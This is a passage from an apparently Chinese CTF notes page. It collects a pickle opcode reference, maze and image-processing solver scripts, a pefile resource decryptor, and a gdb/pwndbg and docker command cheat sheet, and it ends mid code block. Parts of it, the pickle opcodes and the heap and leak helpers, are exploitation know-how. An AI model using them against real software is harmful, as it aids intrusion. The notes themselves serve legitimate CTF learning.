href="https://zhuanlan.zhihu.com/p/90798308">[SUCTF 2019]Guess Game</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">c：引入模块和对象，模块名和对象名以换行符分割<br>&#125;：<span class="hljs-keyword">push</span>一个空的字典，相当于<span class="hljs-keyword">push</span> &#123;&#125;<br><span class="hljs-symbol">S:</span> <span class="hljs-keyword">push</span>一个字符串<br><span class="hljs-symbol">I:</span> <span class="hljs-keyword">push</span>一个整型<br><span class="hljs-symbol">s:</span> <span class="hljs-keyword">pop</span>两位 ，然后作为字典的key和value<br><span class="hljs-symbol">b:</span> 调用__setstate__ 或者 __dict__.update()<br>(：压入一个标志到栈中，表示元组的开始位置<br>t：从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中<br>R：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上<br>p：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引<br>V、S：向栈顶压入一个（unicode）字符串<br>.：表示整个程序结束<br></code></pre></td></tr></table></figure><h2 id="python-bfs寻最长路径实现（走迷宫）"><a href="#python-bfs寻最长路径实现（走迷宫）" class="headerlink" title="python bfs寻最长路径实现（走迷宫）"></a>python bfs寻最长路径实现（走迷宫）</h2><p><a href="https://github.com/ev0A/SCTF2019-Write-Up#maaaaaaze">原题</a>的路径在html的td标签中，所以还需要BeautifulSoup处理一下html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#处理html部分</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Maze.html&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    html_doc = file.read()<br>soup = BeautifulSoup(html_doc, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>lattice = soup.find_all(<span class="hljs-string">&#x27;td&#x27;</span>)<br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;border-([a-z]+):&#x27;</span>)<br>maze = []<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    temp1 = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(j * <span class="hljs-number">100</span>, j * <span class="hljs-number">100</span> + <span class="hljs-number">100</span>):<br>        temp = <span class="hljs-string">&quot;&quot;</span><br>        result = pattern.findall(<span class="hljs-built_in">str</span>(lattice[i]))<br>        <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;top&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;u&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;bottom&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;d&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;right&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;r&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;left&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            temp += <span class="hljs-string">&quot;l&quot;</span><br>        temp1.append(temp)<br>    maze.append(temp1)<br><span class="hljs-comment">#bfs部分，参考Nu1l师傅的脚本，更加简洁</span><br>move = &#123;<span class="hljs-string">&#x27;u&#x27;</span>: (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;d&#x27;</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;l&#x27;</span>: (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;r&#x27;</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)&#125;<br>queue = deque()<br>queue.append(((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>))<br>visited = []<br>ans = <span class="hljs-number">0</span><br>ansv = ()<br><span class="hljs-keyword">while</span> queue:<br>    v, res = queue.popleft()<br>    <span class="hljs-keyword">if</span> res &gt; ans:<br>        ans = res<br>        ansv = v<br>    <span class="hljs-keyword">if</span> v <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>        visited.append(v)<br>        <span class="hljs-keyword">for</span> adj <span class="hljs-keyword">in</span> maze[v[<span class="hljs-number">0</span>]][v[<span class="hljs-number">1</span>]]:<br>            queue.append(((v[<span class="hljs-number">0</span>] + move[adj][<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>] + move[adj][<span class="hljs-number">1</span>]), res + <span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(ansv, ans)<br></code></pre></td></tr></table></figure><p>假如迷宫是png形式： <a href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#so_long</a> 。<a href="https://github.com/AkaSec-1337-CyberSecurity-Club/Akasec-CTF-2024/tree/main/misc/so_long">官方脚本</a>可能更好</p><h2 id="PIL遍历图片的rgb值并打印"><a href="#PIL遍历图片的rgb值并打印" class="headerlink" title="PIL遍历图片的rgb值并打印"></a>PIL遍历图片的rgb值并打印</h2><p><a href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> random<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Chall.png&#x27;</span>)<br>pix = img.load()<br>w, h = img.size<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>        r,g,b,a = img.getpixel((i,c))<br>        <span class="hljs-keyword">if</span> r == <span class="hljs-number">255</span> <span class="hljs-keyword">and</span> g == <span class="hljs-number">255</span> <span class="hljs-keyword">and</span> b == <span class="hljs-number">255</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(r,g,b,a)<br></code></pre></td></tr></table></figure><h2 id="PIL-numpy-cv2处理带有图片像素值的txt"><a href="#PIL-numpy-cv2处理带有图片像素值的txt" class="headerlink" title="PIL+numpy+cv2处理带有图片像素值的txt"></a>PIL+numpy+cv2处理带有图片像素值的txt</h2><p><a href="https://xelessaway.medium.com/0xl4ugh-ctf-2023-c86b0421fd23">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-keyword">as</span> im<br><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;weirdoooo.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>data2 = []<br><span class="hljs-comment"># create empty img 1024*1024</span><br>img = np.zeros((<span class="hljs-number">1024</span>,<span class="hljs-number">1024</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    data2.append(data[i].split(<span class="hljs-string">&#x27; &#x27;</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data2)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data2[i])):<br>        <span class="hljs-keyword">if</span>  data2[i][j] == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            img[i][j]=data2[i][j]<br><span class="hljs-built_in">print</span>(img.shape)<br>out=img.astype(np.uint8) <span class="hljs-comment">#数值类型转换， https://numpy.org/doc/stable/reference/generated/numpy.ndarray.astype.html</span><br>out = im.fromarray(out) <span class="hljs-comment">#从数组转为图片， https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.fromarray</span><br><span class="hljs-comment">#out.convert()</span><br>out.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>flag = cv2.imread(<span class="hljs-string">&#x27;flag.png&#x27;</span>) <span class="hljs-comment">#opencv的参考https://www.geeksforgeeks.org/python-opencv-cv2-imread-method/</span><br>cv2.imshow(<span class="hljs-string">&#x27;flag&#x27;</span>,flag)<br>cv2.waitKey(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h2 id="使用pefile库读取pefile文件内容并修改"><a href="#使用pefile库读取pefile文件内容并修改" class="headerlink" title="使用pefile库读取pefile文件内容并修改"></a>使用pefile库读取pefile文件内容并修改</h2><p><a href="https://gist.github.com/matthw/4ce2a4b9e76eb7008d55661e4792f463">来源</a>。这道题的题目文件加密了重要的检查逻辑文件，且不是直接写的pe文件，还往里面加了没用的数据。直接用pefile读取有效的数据改回来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pefile<br><br>pe = pefile.PE(<span class="hljs-string">&quot;evil.exe&quot;</span>)<br>key = <span class="hljs-string">b&#x27;PHALAN&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_resource</span>(<span class="hljs-params">pe</span>):<br>    <span class="hljs-keyword">for</span> rsrc_type <span class="hljs-keyword">in</span> pe.DIRECTORY_ENTRY_RESOURCE.entries:<br>        <span class="hljs-keyword">for</span> rsrc <span class="hljs-keyword">in</span> rsrc_type.directory.entries:<br>            rsrc = rsrc.directory.entries[<span class="hljs-number">0</span>].data.struct<br>            <span class="hljs-keyword">return</span> pe.get_data(rsrc.OffsetToData, rsrc.Size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data, key</span>):<br>    out = <span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">for</span> n, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>        <span class="hljs-keyword">if</span> data[n] == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> data[n] == key[n % <span class="hljs-built_in">len</span>(key)]:<br>            out[n] = data[n]<br>            <span class="hljs-keyword">continue</span><br>        out[n] = data[n] ^ key[n % <span class="hljs-built_in">len</span>(key)]<br>    <span class="hljs-keyword">return</span> out<br><br>data = get_resource(pe)<br><br>yo = decrypt(data, key)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dumped.pe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(yo)<br></code></pre></td></tr></table></figure><h2 id="python-networkx模块使用"><a href="#python-networkx模块使用" class="headerlink" title="python networkx模块使用"></a>python networkx模块使用</h2><h1 id="最大权重配对问题（maximum-weight-matching）"><a href="#最大权重配对问题（maximum-weight-matching）" class="headerlink" title="最大权重配对问题（maximum weight matching）"></a>最大权重配对问题（maximum weight matching）</h1><p><a href="https://enscribe.dev/ctfs/mhs/prog/matchmaker/">例题及来源</a>，涉及到基本的图论（graph theory）和开花算法（The Blossom Algorithm）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">import</span> networkx <span class="hljs-keyword">as</span> nx<br><span class="hljs-keyword">import</span> networkx.algorithms.matching <span class="hljs-keyword">as</span> matching<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_input</span>(<span class="hljs-params">data: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]:<br>    data = [<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, x.split())) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data.splitlines()[:-<span class="hljs-number">1</span>]]<br>    [data[i].insert(i, <span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))]<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:<br>    p = remote(<span class="hljs-string">&#x27;0.cloud.chals.io&#x27;</span>, [PORT])<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br>        data = parse_input(p.recvuntilS(<span class="hljs-string">b&#x27;&gt; &#x27;</span>))<br>        G: nx.Graph = nx.Graph([(i, j, &#123;<span class="hljs-string">&#x27;weight&#x27;</span>: data[i][j] + data[j][i]&#125;) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data[i])) <span class="hljs-keyword">if</span> i != j])<br>        M: <span class="hljs-built_in">set</span>[<span class="hljs-built_in">tuple</span>] = matching.max_weight_matching(G, maxcardinality=<span class="hljs-literal">True</span>)<br>        M_S: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">tuple</span>] = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>(M) + [(b, a) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> M])<br>        result: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;;&#x27;</span>.join([<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span>,<span class="hljs-subst">&#123;b&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> M_S])<br>        <span class="hljs-built_in">print</span>(data)<br>        p.sendline(result.encode())<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="最短权重路径（Djikstra）"><a href="#最短权重路径（Djikstra）" class="headerlink" title="最短权重路径（Djikstra）"></a>最短权重路径（Djikstra）</h1><p><a href="https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/">https://meashiri.github.io/ctf-writeups/posts/202312-tuctf/</a></p><h2 id="gdb使用-pwndbg）"><a href="#gdb使用-pwndbg）" class="headerlink" title="gdb使用(pwndbg）"></a><a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">gdb使用</a>(<a href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg</a>）</h2><p>补充：</p><ul><li><p>stack &lt;num&gt;</p><blockquote><p>指定查看多少栈内容，直接stack查看的栈帧是不完整的)</p></blockquote></li><li><p>starti &lt;参数&gt;</p><blockquote><p>无论程序去除符号与否，该命令都能保证在程序的开始断下。可以传入参数。</p></blockquote></li><li><p>info file</p><blockquote><p>查看文件信息，可用于获取文件加载基址</p></blockquote></li><li><p>x&#x2F;i $pc</p><blockquote><p>查看当前地址的字节码的反汇编结果</p></blockquote></li><li><p>layout asm</p><blockquote><p>打开反汇编窗口</p></blockquote></li><li><p><a href="https://www.irya.unam.mx/computo/sites/manuales/fce12/debugger/cl/commandref/gdb_mode/cmd_tbreak.htm">tbreak</a></p><blockquote><p>在指定位置插入临时断点</p></blockquote></li><li><p>info proc mappings</p><blockquote><p>查看所有映射，可获取libc加载基址</p></blockquote></li><li><p>x&#x2F;10g $sp</p><blockquote><p>数字10可以任意更改，表示要查看栈上多少个元素。</p></blockquote></li><li><p>p $ebp-0x4</p><blockquote><p>打印对应地址的内容，可配合寄存器使用</p></blockquote></li><li><p>find start,end,str</p><blockquote><p>在start-end的内存中寻找str的地址</p></blockquote></li><li><p>disas [函数名&#x2F;地址]</p><blockquote><p>反编译置顶位置的指令。如果当前所处位置就是想要反编译的函数，可以直接disas。</p></blockquote></li><li><p><a href="https://stackoverflow.com/questions/58851/can-i-set-a-breakpoint-on-memory-access-in-gdb">内存断点</a>：</p><ul><li><p>watch *addr</p><blockquote><p>gdb will break when a write occurs</p></blockquote></li><li><p>rwatch *addr</p><blockquote><p>gdb will break wnen a read occurs</p></blockquote></li><li><p>awatch *addr</p><blockquote><p>gdb will break in both cases</p></blockquote></li></ul></li><li><p>set $rip &#x3D; value (set $eip &#x3D; value)</p><ul><li>设置当前程序的rip&#x2F;eip（64&#x2F;32）</li></ul></li><li><p>jump _start</p><blockquote><p>重启程序</p></blockquote></li><li><p>find_fake_fast addr size</p><blockquote><p>在指定addr处寻找size大小的符合fastbin的假堆块（找到可用错位获取合法size的地址）</p></blockquote></li><li><p>info threads</p><blockquote><p>查看存在的线程</p></blockquote></li><li><p><code>thread &lt;thread_id&gt;</code></p><blockquote><p>切换到指定id的线程</p></blockquote></li><li><p><code>set *(char **)addr = value</code></p><blockquote><p>设置addr处的内存（64bit），参考 <a href="https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb">https://stackoverflow.com/questions/35370698/how-to-set-an-arbitrary-64-bits-of-memory-in-gdb</a></p></blockquote><ul><li>同理还可以修改汇编指令，找到指令所在的地址处即可。<code>set *(unsigned char*)addr=byte</code>（ <a href="https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program">https://stackoverflow.com/questions/6473908/can-gdb-change-the-assembly-code-of-a-running-program</a> ）.不过这样改是暂时的，重新run的话就要再patch一次</li><li>以及32位下修改addr处的内存（4个字节）：<code>set *(unsigned int*)addr=value</code>。但今天测试后发现直接<code>set *addr=value</code>就行。不过这种方式只能设置32bit</li><li>set命令可以直接设置寄存器的内容为某个字符串。如<code>set $rdi=&quot;/bin/sh&quot;</code>。但似乎不能直接将某个地址的内容设为字符串</li></ul></li><li><p><code>gdb -batch -ex &#39;file &lt;program&gt;&#39; -ex &#39;disassemble &lt;func_name&gt;&#39;</code></p><ul><li>反汇编某个程序的某个函数，参考 <a href="https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump">https://stackoverflow.com/questions/22769246/how-to-disassemble-one-single-function-using-objdump</a></li></ul></li><li><p><code>jump &lt;addr&gt;</code></p><ul><li>跳转到某个地址</li></ul></li><li><p><code>p &amp;name_of_symbol</code></p><ul><li>获取指定symbol的偏移&#x2F;地址（运行时）</li></ul></li><li><p><code>finish</code></p><ul><li>Execute until selected stack frame returns</li></ul></li><li><p>可以用gdbserver跨docker container调试。首先在container内运行：</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run -it -p 2345:2435  ... bash<br>apt update &amp;&amp; apt install -y gdbserver<br>gdsbserver 0:2345 ./chal <br></code></pre></td></tr></table></figure><p>然后本机运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">target remote 0:2345<br></code></pre></td></tr></table></figure><ul><li><code>define hook-stop</code><ul><li>设置程序每次抵达断点处时执行的命令</li></ul></li><li><code>command</code><ul><li>用于定义新命令或是给已存在的命令起alias。也可以用来设置程序每次抵达某个断点处时执行的命令</li></ul></li><li><code>set pagination off</code><ul><li>当需要展示较多信息时，gdb会分页。该命令用于禁用分页，一次输出全部信息</li></ul></li><li>如何调试fork的子进程： <a href="https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured">https://stackoverflow.com/questions/15126925/debugging-child-process-after-fork-follow-fork-mode-child-configured</a></li><li>一些pwndbg独有的<a href="https://browserpwndbg.readthedocs.io/en/docs/">命令</a><ul><li><code>distance a b</code><ul><li>获取从a到b地址的差值</li></ul></li><li><code>vis_heap_chunks</code><ul><li>查看堆块（不同堆块会用不同颜色区分）</li></ul></li><li><code>brva offset</code><ul><li>在当前程序的基地址+offset处下断点。要求程序已运行（比如先starti再brva）</li></ul></li><li><code>leakfind</code><ul><li>在指定的地址范围内寻找可供泄露的地址链。使用案例：<code>leakfind 0x7ffff7db7000 --max_offset=0x200000 --page_name stack --max_depth=1</code>,尝试在0x7ffff7db7000偏移最大0x200000的区域内找指向stack地址的地址链，链长度最长为1</li></ul></li><li><code>got -p libc</code><ul><li>打印libc里的可写got表</li></ul></li><li>配合qemu调试16-bit&#x2F;real mode： <a href="https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd">https://gist.github.com/Theldus/4e1efc07ec13fb84fa10c2f3d054dccd</a> ， <a href="https://ternet.fr/gdb_real_mode.html">https://ternet.fr/gdb_real_mode.html</a></li></ul></li></ul><h2 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h2><ul><li><p>docker run –platform linux&#x2F;amd64 -it ubuntu &#x2F;bin&#x2F;bash</p><blockquote><p>开启amd64位的ubuntu container，如果本地没有相应镜像就会自动拉取并开启。注意已有container后无需使用该命令再次创建一个container。</p></blockquote></li><li><p>docker container start [container name]</p><blockquote><p>运行一个已创建的container</p></blockquote></li><li><p>docker container ls</p><blockquote><p>查看已有的container</p></blockquote></li><li><p>docker container attach [CONTAINER ID]</p><blockquote><p>附加到一个已运行的container（可获取高亮，自动补全，需要先用<code>docker container start</code>启动container）</p></blockquote></li><li><p>docker rename [old name] [new name]</p><blockquote><p>重命名container</p></blockquote></li><li><p>docker run -i -v “`pwd`:&#x2F;chal” -t xxx@sha256:xxx</p><blockquote><p>以container形式运行镜像。一般在题目的docker file中能看到<code>xxx@sha256:xxx</code>字样，这就是镜像（image）。-v指定双向挂载，任何在container内部的chal文件夹的文件也会出现在当前目录中（`pwd`命令）。</p></blockquote></li><li><p>从Dockerfile build： <a href="https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile">https://stackoverflow.com/questions/36075525/how-do-i-run-a-docker-instance-from-a-dockerfile</a></p><ul><li>注意Dockerfile命名不要改成其他的，而且要放在当前目录下</li><li><code>docker build --tag &#39;name&#39; .</code></li><li><code>docker image ls</code>：查看build的image</li></ul></li><li><p>interactive运行docker image： <a href="https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile">https://stackoverflow.com/questions/40854482/interactive-command-in-dockerfile</a></p><ul><li><code>docker run -it &lt;image id&gt; /bin/bash</code></li><li>如果是web题需要开放端口： <code>docker run -it --expose &lt;container port&gt; -p &lt;host port&gt;:&lt;container port&gt; &lt;image id&gt;</code>,参考 <a href="https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host">https://stackoverflow.com/questions/30109037/how-can-i-forward-localhost-port-on-my-container-to-localhost-on-my-host</a></li></ul></li><li><p>从Container里拷贝文件到本机： <a href="https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host">https://stackoverflow.com/questions/22049212/copying-files-from-docker-container-to-host</a></p><ul><li>查看container id&#x2F;name（不要和上面的image id搞混了）：<code>docker container ls</code></li><li>libc等文件的路径： <a href="https://stackoverflow.com/questions/5925678/location-of-c-standard-library">https://stackoverflow.com/questions/5925678/location-of-c-standard-library</a> 。或者直接用<code>ldd binary</code>获取路径</li><li>今天又看见个脚本： <a href="https://github.com/rerrorctf/ret/blob/main/commands/libc.go">https://github.com/rerrorctf/ret/blob/main/commands/libc.go</a> ，可以直接将container里的libc提取出来</li></ul></li><li><p><code>docker run -it &lt;image id&gt; /bin/bash -v pwd1:pwd2</code></p><ul><li>与docker container共享目录。本机上的pwd1目录等同于container内部的pwd2目录</li></ul></li></ul><h2 id="Qemu-arm-amd64-x86-arm"><a href="#Qemu-arm-amd64-x86-arm" class="headerlink" title="Qemu arm-&gt;amd64&#x2F;x86-&gt;arm"></a>Qemu arm-&gt;amd64&#x2F;x86-&gt;arm</h2><ul><li>arm-&gt;amd64<ul><li><a href="https://rw1nd.github.io/2021/04/13/x86-on-arm/">https://rw1nd.github.io/2021/04/13/x86-on-arm/</a></li><li><a href="https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8">https://levelup.gitconnected.com/running-amd64-linux-on-apple-m1-with-qemu-utm-64d67cccd6f8</a></li></ul></li><li>x86-&gt;arm<ul><li><a href="https://azeria-labs.com/arm-on-x86-qemu-user/">https://azeria-labs.com/arm-on-x86-qemu-user/</a></li></ul></li></ul><h2 id="gdb调试脚本"><a href="#gdb调试脚本" class="headerlink" title="gdb调试脚本"></a>gdb调试脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 